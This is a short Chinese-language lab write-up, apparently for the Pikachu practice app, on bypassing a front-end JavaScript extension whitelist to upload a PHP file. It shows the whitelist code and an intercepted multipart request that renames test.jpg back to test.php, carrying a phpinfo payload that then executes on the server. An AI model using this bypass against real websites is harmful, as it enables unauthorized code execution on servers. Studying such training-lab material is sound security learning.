



隨便上傳個php 會跳出
`上传的文件不符合要求，请重新选择`  
我們用這訊息尋找前端js 

JS
```javascript=
<script>
    function checkFileExt(filename)
    {
        var flag = false; //状态
        
        var arr = ["jpg","png","gif"];
        //取出上传文件的扩展名
        var index = filename.lastIndexOf(".");
        var ext = filename.substr(index+1);
        //比较
        for(var i=0;i<arr.length;i++)
        {
            if(ext == arr[i])
            {
                flag = true; //一旦找到合适的，立即退出循环
                break;
            }
        }

        //条件判断
        if(!flag)
        {
            alert("上传的文件不符合要求，请重新选择！");
            location.reload(true);
        }
    }
</script>
```


### 也就是說只允許jpg png gif 這三種後綴檔名


繞過方法:

test.php  更改後綴為 test.jpg

```
<?php phpinfo();?>
```


可以成功繞過前端過濾並上傳，不過這裡需要用BP 修改一下


```
-----------------------------418538965427259840221581036946
Content-Disposition: form-data; name="uploadfile"; filename="test.jpg"
Content-Type: image/jpeg

<?php phpinfo();?>
-----------------------------418538965427259840221581036946
Content-Disposition: form-data; name="submit"

开始上传
-----------------------------418538965427259840221581036946--


```

* test.jpg 在改回來 test.php

* 有些題目會判斷content-type (請注意)
content-type 是為了讓server了解對方傳過來是啥數據。

這樣就可以上傳php檔案。


可以成功執行
```
http://pika/vul/unsafeupload/uploads/test.php
```


